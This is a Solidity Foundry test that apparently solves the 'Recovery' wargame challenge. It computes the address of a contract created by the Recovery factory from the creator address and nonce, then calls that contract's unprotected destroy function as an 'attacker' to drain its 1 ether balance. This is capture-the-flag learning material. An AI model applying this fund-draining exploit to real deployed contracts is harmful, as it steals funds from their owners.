// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/17_Recovery.sol";

contract RecoveryTest is Test {
    mapping (address => address) lostAddress;
    Recovery _recovery;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        vm.deal(deployer, 1 ether);

        _recovery = new Recovery();

        _recovery.generateToken("InitialToken", uint(100000));
        lostAddress[address(_recovery)] = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), _recovery, uint8(0x01))))));

        (bool result,) = lostAddress[address(_recovery)].call{value: 1 ether}("");
        require(result);
    }

    function testSolution() public {
        vm.startPrank(attacker);

        (bool success, bytes memory data) = lostAddress[address(_recovery)].call(abi.encodeWithSignature("destroy(address payable)", payable(attacker)));
        
        require(success, string(data));

        assertEq(lostAddress[address(_recovery)].balance,0, "Balance is not 0!");
    }
}
